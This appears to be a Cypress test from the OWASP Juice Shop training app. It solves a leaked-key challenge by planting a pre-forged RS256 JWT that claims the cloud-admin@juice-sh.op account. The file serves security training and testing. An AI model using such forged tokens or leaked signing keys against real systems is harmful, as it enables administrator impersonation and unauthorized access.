describe('/', () => {
  describe('challenge "iacLeakedKeyChallenge"', () => {
    it('should accept an RS256-signed token with email cloud-admin@juice-sh.op using the leaked private key', () => {
      cy.window().then(() => {
        localStorage.setItem(
          'token',
          'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImVtYWlsIjoiY2xvdWQtYWRtaW5AanVpY2Utc2gub3AifSwiaWF0IjoxNzgzNTg3MDc1fQ.o1ghEUyLemmv982A2CW_w_RLh9FDYOx1GxU-_GeyEwfO8vBKIa-Ubh1bmdmP_WmySrekzy_0zfII-wjmj_e_6hKvZz0IDR_EyfDjCmYVzu8YdgQSNNZXu3_kLdXEKjJirXU5bPUdUIiR2GoMcOAXQouna3RAn4rkR90rDJeNblU'
        )
      })
      cy.visit('/#/')
      cy.expectChallengeSolved({ challenge: 'Login Cloud Admin' })
    })
  })
})
